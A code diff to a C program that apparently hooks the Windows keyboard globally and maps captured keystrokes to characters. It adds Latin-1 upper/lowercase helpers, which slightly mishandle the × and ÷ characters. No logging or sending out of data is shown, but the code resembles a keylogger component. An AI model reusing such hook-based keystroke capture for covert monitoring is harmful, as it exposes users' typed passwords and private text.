@@ -6,6 +6,32 @@ HHOOK keyboardHook = NULL;
 u8 lShiftPressed = 0, rShiftPressed = 0, keyAfterShift = 1;
 char chr[65] = {0};
 
+void toUpperCase(char* buffer) {
+    u32 len = strlen(buffer);
+    for (u32 i = 0; i < len; i++) {
+        u8 c = (u8)buffer[i];
+        if (c >= 0x61 && c <= 0x7A) {
+            c -= 0x20;
+        } else if (c >= 0xE0 && c <= 0xFD) {
+            c -= 0x20;
+        }
+        buffer[i] = (char) c;
+    }
+}
+
+void toLowerCase(char* buffer) {
+    u32 len = strlen(buffer);
+    for (u32 i = 0; i < len; i++) {
+        u8 c = (u8)buffer[i];
+        if (c >= 0x41 && c <= 0x5A) {
+            c += 0x20;
+        } else if (c >= 0xC0 && c <= 0xDD) {
+            c += 0x20;
+        }
+        buffer[i] = (char) c;
+    }
+}
+
 int getKeyName(u32 vkCode, char* buffer, u32 size) {
     u32 vsc = MapVirtualKeyEx(vkCode, 0, GetKeyboardLayout(0)); //MAPVK_VK_TO_VSC
     switch (vkCode) {
@@ -29,9 +55,7 @@ void dictionary(u32 key) {
     memset(chr, 0, 65);
     u8 test = MapVirtualKeyEx(key, 2, GetKeyboardLayout(0)); //MAPVK_VK_TO_CHAR
     if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
-        (test >= 0x80 && test <= 0x87 && test != 0x83 && test != 0x85) ||
-        (test >= 0x8E && test <= 0x90) || test == 0x99 || test == 0x9A ||
-        test == 0x94 || test == 0xA4 || test == 0xA5) {
+        (test >= 0xC0 && test <= 0xDD) || (test >= 0xE0 && test <= 0xFD)) {
         keyAfterShift = 1;
     }
     if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Check if is printable
@@ -44,9 +68,9 @@ void dictionary(u32 key) {
         }
         chr[0] = test;
         if (isCap == 1) {
-            _strupr(chr);
+            toUpperCase(chr);
         } else {
-            _strlwr(chr);
+            toLowerCase(chr);
         }
         /*
         if (isCap == 0 && ((test >= 0x41 && test <= 0x5A) || (test >= 0xC0 && test <= 0xDF))) {
